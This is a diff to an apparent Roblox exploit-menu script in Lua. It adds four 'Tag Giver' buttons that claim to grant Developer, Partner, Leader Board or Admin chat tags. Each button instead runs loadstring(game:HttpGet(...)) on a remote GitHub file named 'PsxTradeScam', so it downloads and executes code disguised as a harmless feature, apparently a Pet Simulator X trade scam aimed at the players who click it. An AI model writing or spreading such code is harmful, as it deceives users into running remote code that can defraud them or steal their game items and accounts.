@@ -75,11 +75,25 @@ end)
 
 --seventh
 local SepcialTags = Window:NewTab("Tag Giver")
-local SepcialTagsSection = SepcialTags:NewSection("Developer Tag")
-local SepcialTagsSection = SepcialTags:NewSection("Partner Tag")
+local SepcialTagsSection = SepcialTags:NewSection("Tag Giver ")
 
 
-SepcialTagsSection:NewButton("Tag Giver", "Gives a special tag in chat", function()
+SepcialTagsSection:NewButton("Developer Tag🛠️", "Gives Developer Tag in chat", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
+end)
+
+
+SepcialTagsSection:NewButton("Partner Tag 🔥", "Gives partner tag in chat", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
+end)
+
+
+SepcialTagsSection:NewButton("Leader Board Tag🌎", "Gives Leader Board tag in chat", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
+end)
+
+
+SepcialTagsSection:NewButton("Admin Tag💪", "Gives Admin tag in chat", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
